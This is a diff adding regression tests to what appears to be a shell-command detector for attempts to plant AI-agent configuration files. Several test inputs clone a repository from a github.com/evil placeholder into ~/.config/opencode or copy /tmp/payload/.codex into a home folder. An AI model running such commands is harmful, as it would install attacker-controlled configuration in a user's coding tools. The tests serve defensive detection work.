@@ -1023,3 +1023,42 @@ def test_qa12_mcp_into_xdg():
 ])
 def test_qa12_silent(cmd):
     assert _only(_shell(cmd)) is None, cmd
+
+
+# ---- QA round 13 regressions ----------------------------------------------------
+@pytest.mark.parametrize("cmd", [
+    "cp " + "x " * 64 + "~/" + "/" * 5000,
+    "cp " + "x " * 64 + "/home/u/" + "/" * 19800,
+    ("cp " + "x " * 60 + "~/" + ".config/" * 230 + " ; ") * 10,
+    ("cp -rt " + ".cursor/" * 300 + " " + "x " * 60 + "; ") * 8,
+])
+def test_qa13_bounded(cmd):
+    t = time.time()
+    _only(_shell(cmd[:20000]))
+    assert time.time() - t < 0.5
+
+
+@pytest.mark.parametrize("cmd,cwd", [
+    ("cd ~/.config && git clone https://github.com/evil/x opencode && cd opencode && ls", "/repo"),
+    ("cd ~/.config && git clone https://e/x opencode && cd -", "/repo"),
+    ("cp -r /tmp/payload/.codex . ; cd /tmp", "/home/u"),
+    ("cd ~/.config; git clone --depth 1 https://github.com/evil/x.git opencode", "/repo"),
+    ("cd ~/.config; git clone -b main https://github.com/evil/x.git opencode", "/repo"),
+    ("cd ~/.config; git clone --branch=main https://github.com/evil/x.git opencode", "/repo"),
+    ("git clone https://github.com/evil/opencode", "/home/u/.config"),
+    ("git clone --depth 1 https://github.com/evil/opencode", "/home/u/.config"),
+])
+def test_qa13_clone_cd_forms(cmd, cwd):
+    assert _only(_shell(cmd, cwd=cwd)) is not None, cmd
+
+
+@pytest.mark.parametrize("cmd,cwd", [
+    ("git clone https://github.com/a/opencode", "/repo"),
+    ("git clone https://github.com/a/opencode", "/home/u"),
+    ("cd ~/src && git clone https://github.com/a/opencode", "/repo"),
+    ("cd ~/.config && ls && cd /tmp && git clone https://e/x opencode", "/repo"),
+    ("mv ~/.codex ~/.codex.old", "/repo"),
+    ("cp -r ~/.codex ~/backups/codex", "/repo"),
+])
+def test_qa13_silent(cmd, cwd):
+    assert _only(_shell(cmd, cwd=cwd)) is None, cmd
